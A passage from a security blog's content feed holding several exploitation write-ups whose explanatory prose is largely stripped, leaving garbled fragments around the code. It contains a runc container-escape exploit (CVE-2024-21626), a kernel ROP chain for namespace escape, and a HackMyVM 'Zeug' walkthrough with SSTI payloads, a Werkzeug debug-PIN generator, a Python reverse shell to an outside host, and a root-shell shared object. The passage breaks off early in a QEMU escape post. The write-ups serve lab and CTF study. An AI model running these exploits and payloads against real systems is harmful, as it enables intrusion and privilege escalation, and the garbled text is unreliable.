class="literal">nil</span> &#123;</span><br><span class="line">fmt.Println(err)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// /proc/pid/exefdfdrunc</span></span><br><span class="line"><span class="keyword">var</span> handleFd = <span class="number">-1</span></span><br><span class="line"><span class="keyword">for</span> handleFd == <span class="number">-1</span> &#123;</span><br><span class="line"><span class="comment">// Note, you do not need to use the O_PATH flag for the exploit to work.</span></span><br><span class="line">handle, _ := os.OpenFile(<span class="string">&quot;/proc/&quot;</span>+strconv.Itoa(found)+<span class="string">&quot;/exe&quot;</span>, os.O_RDONLY, <span class="number">0777</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="type">int</span>(handle.Fd()) &gt; <span class="number">0</span> &#123;</span><br><span class="line">handleFd = <span class="type">int</span>(handle.Fd())</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">fmt.Println(<span class="string">&quot;[+] Successfully got the file handle&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// runcrunc</span></span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">writeHandle, _ := os.OpenFile(<span class="string">&quot;/proc/self/fd/&quot;</span>+strconv.Itoa(handleFd), os.O_WRONLY|os.O_TRUNC, <span class="number">0700</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="type">int</span>(writeHandle.Fd()) &gt; <span class="number">0</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;[+] Successfully got write handle&quot;</span>, writeHandle)</span><br><span class="line">writeHandle.Write([]<span class="type">byte</span>(payload))</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>CVE-2024-21626<code>runc</code></p><p>CVE<a href="https://bestwing.me/CVE-2024-21626-container-escape.html"></a></p><p><del>NB</del></p><h4 id="containerd"><a href="#containerd" class="headerlink" title="containerd"></a>containerd</h4><p>containerd <strong></strong><strong></strong><strong></strong>containerd </p><ul><li></li><li>&#x2F;</li><li></li><li> runc  runc </li><li></li></ul><h3 id=""><a href="#" class="headerlink" title=""></a></h3><h4 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h4><p>commit_creds(prepare_kernel_cred(0))namespacetask_structfs_structns_proxy</p><p>CVE-2021-22555root<code>init_nsproxy</code><code>switch_task_namespaces(find_task_by_vpid(1), init_nsproxy)</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// switch_task_namespaces(find_task_by_vpid(1), init_nsproxy)</span></span><br><span class="line">  *rop++ = kbase_addr + POP_RDI_RET;</span><br><span class="line">  *rop++ = <span class="number">1</span>; <span class="comment">// RDI</span></span><br><span class="line">  *rop++ = kbase_addr + FIND_TASK_BY_VPID;</span><br><span class="line">  *rop++ = kbase_addr + POP_RCX_RET;</span><br><span class="line">  *rop++ = <span class="number">4</span>; <span class="comment">// RCX</span></span><br><span class="line">  *rop++ = kbase_addr + CMP_RCX_4_JNE_POP_RBP_RET;</span><br><span class="line">  *rop++ = <span class="number">0xDEADBEEF</span>; <span class="comment">// RBP</span></span><br><span class="line">  *rop++ = kbase_addr + MOV_RDI_RAX_JNE_XOR_EAX_EAX_RET;</span><br><span class="line">  *rop++ = kbase_addr + POP_RSI_RET;</span><br><span class="line">  *rop++ = kbase_addr + INIT_NSPROXY; <span class="comment">// RSI</span></span><br><span class="line">  *rop++ = kbase_addr + SWITCH_TASK_NAMESPACES;</span><br></pre></td></tr></table></figure><h4 id="dirty-pipe"><a href="#dirty-pipe" class="headerlink" title="dirty pipe"></a>dirty pipe</h4><p><code>CAP_DAC_READ_SEARCH</code><code>CAP_DAC_READ_SEARCH</code><code>open_by_handle_at</code>, cap <a href="https://github.com/greenhandatsjtu/CVE-2022-0847-Container-Escape">(3)</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --<span class="built_in">rm</span> -it --cap-add=CAP_DAC_READ_SEARCH ubuntu</span><br></pre></td></tr></table></figure><h2 id=""><a href="#" class="headerlink" title=""></a></h2><ul><li><a href="https://wiki.teamssix.com/CloudNative/"> | T Wiki (teamssix.com)</a></li><li><a href="https://liuliuliuzy.github.io/tags/docker/">Docker</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> CSE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HMV-Zeug</title>
      <link href="/2024/02/22/HMV-Zeug/"/>
      <url>/2024/02/22/HMV-Zeug/</url>
      
        <content type="html"><![CDATA[<blockquote><p></p></blockquote><span id="more"></span><h2 id=""><a href="#" class="headerlink" title=""></a></h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">$ sudo nmap -p- --min-rate=10000 &lt;IP&gt;</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.124.6</span><br><span class="line">Host is up (0.0012s latency).</span><br><span class="line">Not shown: 65533 closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">21/tcp   open  ftp</span><br><span class="line">5000/tcp open  upnp</span><br><span class="line">MAC Address: 08:00:27:8D:5E:6D (Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Nmap done at Thu Feb 22 10:23:52 2024 -- 1 IP address (1 host up) scanned in 66.37 seconds</span></span><br><span class="line"></span><br><span class="line">$ <span class="variable">$sudo</span> nmap -p21,5000 -sCV &lt;IP&gt;</span><br><span class="line"><span class="comment"># ...</span></span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">21/tcp   open  ftp     vsftpd 3.0.3</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">|_-rw-r--r--    1 0        0             109 Jan 06 23:14 README.txt</span><br><span class="line">| ftp-syst: </span><br><span class="line">|   STAT: </span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to ::ffff:192.168.124.13</span><br><span class="line">|      Logged <span class="keyword">in</span> as ftp</span><br><span class="line">|      TYPE: ASCII</span><br><span class="line">|      No session bandwidth <span class="built_in">limit</span></span><br><span class="line">|      Session <span class="built_in">timeout</span> <span class="keyword">in</span> seconds is 300</span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      At session startup, client count was 3</span><br><span class="line">|      vsFTPd 3.0.3 - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line">5000/tcp open  upnp?</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   GetRequest: </span><br><span class="line">|     HTTP/1.1 200 OK</span><br><span class="line">|     Server: Werkzeug/3.0.1 Python/3.11.2</span><br><span class="line">|     Date: Thu, 22 Feb 2024 05:56:24 GMT</span><br><span class="line">|     Content-Type: text/html; charset=utf-8</span><br><span class="line">|     Content-Length: 549</span><br><span class="line">|     Connection: close</span><br><span class="line"></span><br><span class="line"><span class="comment"># ...</span></span><br><span class="line">Service Info: OS: Unix</span><br></pre></td></tr></table></figure><h2 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h2><p>anonymous README</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ftp&gt; get README.md</span><br><span class="line"></span><br><span class="line">$ cat README.txt</span><br><span class="line">Hi, Cosette, don&#x27;t forget to disable the debug mode in the web application, we don&#x27;t want security breaches.</span><br></pre></td></tr></table></figure><h2 id="Werkzeug-WEB"><a href="#Werkzeug-WEB" class="headerlink" title="Werkzeug WEB"></a>Werkzeug WEB</h2><h3 id="DEBUG"><a href="#DEBUG" class="headerlink" title="DEBUG"></a>DEBUG</h3><p>DEBUG <code>/console</code>  <code>PIN</code></p><h3 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h3><p>html <code>SSTI</code><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinja2---basic-injection">PayloadsAllTheThings</a></p><p></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config.items()&#125;&#125;</span><br><span class="line">&#123;&#123; [].<span class="keyword">class</span>.base.subclasses() &#125;&#125;  <span class="comment"># [] subclasses</span></span><br><span class="line">&#123;&#123; self.__init__.__globals__.__builtins__ &#125;&#125;  <span class="comment"># init</span></span><br><span class="line">&#123;&#123; get_flashed_messages.__globals__.__builtins__.<span class="built_in">open</span>(<span class="string">&quot;/etc/passwd&quot;</span>).read() &#125;&#125;</span><br><span class="line">&#123;&#123; lipsum.__globals__[<span class="string">&quot;os&quot;</span>].popen(<span class="string">&#x27;id&#x27;</span>).read() &#125;&#125;  <span class="comment"># os popen</span></span><br></pre></td></tr></table></figure><h3 id="PIN"><a href="#PIN" class="headerlink" title="PIN"></a>PIN</h3><p><a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug">Werkzeug &#x2F; Flask Debug - HackTricks</a></p><p>machin_id </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_machine_id</span>() -&gt; <span class="built_in">str</span> | <span class="built_in">bytes</span> | <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">global</span> _machine_id</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> _machine_id <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> _machine_id</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_generate</span>() -&gt; <span class="built_in">str</span> | <span class="built_in">bytes</span> | <span class="literal">None</span>:</span><br><span class="line">        linux = <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># machine-id is stable across boots, boot_id is not.</span></span><br><span class="line">        <span class="keyword">for</span> filename <span class="keyword">in</span> <span class="string">&quot;/etc/machine-id&quot;</span>, <span class="string">&quot;/proc/sys/kernel/random/boot_id&quot;</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    value = f.readline().strip()</span><br><span class="line">            <span class="keyword">except</span> OSError:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> value:</span><br><span class="line">                linux += value</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/proc/self/cgroup&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                linux += f.readline().strip().rpartition(<span class="string">b&quot;/&quot;</span>)[<span class="number">2</span>]</span><br><span class="line">        <span class="keyword">except</span> OSError:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> linux:</span><br><span class="line">            <span class="keyword">return</span> linux</span><br></pre></td></tr></table></figure><ol><li>Username. <code>/etc/passwd : cosette</code></li><li>Full path of the app. <code>/home/cosette/zeug/venv/lib/python3.11/site-packages/flask/app.py</code></li><li>MAC address of the target machine. <code>/sys/class/net/enp0s3/address =&gt; 08:00:27:8d:5e:6d =&gt; 8796756598381</code></li><li>Machine ID : <code>/etc/machine-id=&gt;48329e233f524ec291cce7479927890b</code> &amp;&amp; <code>/proc/sys/kernel/random/boot_id=&gt;901d0a34-e4f9-4a52-8a83-3840d0c0bfb1</code> &amp;&amp; <code>/proc/self/cgroup=&gt;0::/system.slice/zeug-app.service</code>).</li></ol><p>PIN</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"></span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;cosette&#x27;</span>,  <span class="comment"># username</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,  <span class="comment"># modname</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,  <span class="comment"># getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span></span><br><span class="line">    <span class="string">&#x27;/home/cosette/zeug/venv/lib/python3.11/site-packages/flask/app.py&#x27;</span>  <span class="comment"># getattr(mod, &#x27;__file__&#x27;, None),</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;8796756598381&#x27;</span>,  </span><br><span class="line">    <span class="string">&#x27;48329e233f524ec291cce7479927890bzeug-app.service&#x27;</span>  </span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># h = hashlib.md5()  # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0</span></span><br><span class="line">h = hashlib.sha1()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"><span class="comment"># h.update(b&#x27;shittysalt&#x27;)</span></span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure><p>PINDEBUGpython reverse shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="string">&quot;10.10.10.10&quot;</span>,<span class="number">9001</span>));os.dup2(s.fileno(),<span class="number">0</span>); os.dup2(s.fileno(),<span class="number">1</span>);os.dup2(s.fileno(),<span class="number">2</span>);<span class="keyword">import</span> pty; pty.spawn(<span class="string">&quot;sh&quot;</span>)</span><br></pre></td></tr></table></figure><p>pty</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line"></span><br><span class="line">(inside the nc session) </span><br><span class="line">CTRL+Z</span><br><span class="line"></span><br><span class="line"><span class="built_in">stty</span> raw -<span class="built_in">echo</span>; <span class="built_in">fg</span>; <span class="built_in">ls</span>; <span class="built_in">export</span> SHELL=/bin/bash; <span class="built_in">export</span> TERM=screen; <span class="built_in">stty</span> rows 38 columns 116; reset;</span><br></pre></td></tr></table></figure><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>seed</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cosette@zeug:~$ sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> cosette on zeug:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,</span><br><span class="line">    use_pty</span><br><span class="line"></span><br><span class="line">User cosette may run the following commands on zeug:</span><br><span class="line">    (exia) NOPASSWD: /home/exia/seed</span><br></pre></td></tr></table></figure><p>seed_bak: v5<code>0x6b8b4567</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+Ch] [rbp-14h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">banner</span>(argc, argv, envp);</span><br><span class="line">  <span class="built_in">srand</span>(<span class="number">1u</span>);</span><br><span class="line">  v5 = <span class="built_in">rand</span>();</span><br><span class="line">  v6 = <span class="number">0xDEADBEEF</span>;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter a number: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v4);</span><br><span class="line">  <span class="keyword">if</span> ( v6 == (v5 ^ v4) )</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Wrong.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u exia /home/exia/seed</span><br></pre></td></tr></table></figure><p>root</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">exia@zeug:/dev/shm$ sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> exia on zeug:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,</span><br><span class="line">    use_pty</span><br><span class="line"></span><br><span class="line">User exia may run the following commands on zeug:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/zeug</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> __fastcall <span class="built_in">main</span>(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">dlopen</span>(<span class="string">&quot;/home/exia/exia.so&quot;</span>, <span class="number">2</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">fwrite</span>(<span class="string">&quot;Error opening file\n&quot;</span>, <span class="number">1uLL</span>, <span class="number">0x13</span>uLL, _bss_start);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>dlopen <a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation#ld_preload-and-ld_library_path">Linux Privilege Escalation</a></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc -fPIC -shared -o pe.so pe.c -nostartfiles</span></span><br><span class="line"><span class="comment">// sudo -u root /usr/bin/zeug</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> _init() &#123;</span><br><span class="line">    <span class="built_in">unsetenv</span>(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">    <span class="built_in">setgid</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">setuid</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> HMV </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HMV </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Qemu-escape</title>
      <link href="/2024/02/19/Qemu-escape/"/>
      <url>/2024/02/19/Qemu-escape/</url>
      
        <content type="html"><![CDATA[<blockquote><p></p></blockquote><span id="more"></span><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h3 id="qemu-mode"><a href="#qemu-mode" class="headerlink" title="qemu mode"></a>qemu mode</h3><ol><li>User modeQEMU x86arm</li><li>System modeQEMU </li><li>KVMKVMKernel-based Virtual Machine TYPE1 Hypervisor VMM  HostOS  Host Hardware </li><li>XenXenXenXenXen</li></ol><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>qemu<strong></strong>mmap0x40000000</p><p><a href="https://aidaip.github.io/binary/2021/03/11/VM-escape-QEMU-Case-Study.html">(1)</a></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Guest&#x27; processes</span><br><span class="line">                     +--------------------+</span><br><span class="line">Virtual addr space   |                    |</span><br><span class="line">                     +--------------------+</span><br><span class="line">                     |                    |</span><br><span class="line">                     \__   Page Table     \__</span><br><span class="line">                        \                    \</span><br><span class="line">                         |                    |  Guest kernel</span><br><span class="line">                    +----+--------------------+----------------+</span><br><span class="line">Guest&#x27;s phy. memory |    |                    |                |</span><br><span class="line">                    +----+--------------------+----------------+</span><br><span class="line">                    |                                          |</span><br><span class="line">                    \__                                        \__</span><br><span class="line">                       \                                          \</span><br><span class="line">                        |             QEMU process                 |</span><br><span class="line">                   +----+------------------------------------------+</span><br><span class="line">Virtual addr space |    |                                          |</span><br><span class="line">                   +----+------------------------------------------+</span><br><span class="line">                   |                                               |</span><br><span class="line">                    \__                Page Table                   \__</span><br><span class="line">                       \                                               \</span><br><span class="line">                        |                                               |</span><br><span class="line">                   +----+-----------------------------------------------++</span><br><span class="line">Physical memory    |    |                                               ||</span><br><span class="line">                   +----+-----------------------------------------------++</span><br></pre></td></tr></table></figure><p>PCIDevice idVendor id</p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><ol><li></li><li> QEMU  QEMU  mmap  QEMU  mmap  QEMU </li><li></li></ol><ul><li> x64  page offset (bits 0-11)  page number <code>/proc/pid/pagemap</code><a href="https://www.kernel.org/doc/html/latest/admin-guide/mm/pagemap.html">(2)</a>  CAP_SYS_ADMIN  64 </li></ul><ol start="4"><li></li></ol><ul><li>Guest OS  Host OS  Guets OS </li></ul><p>qemu</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 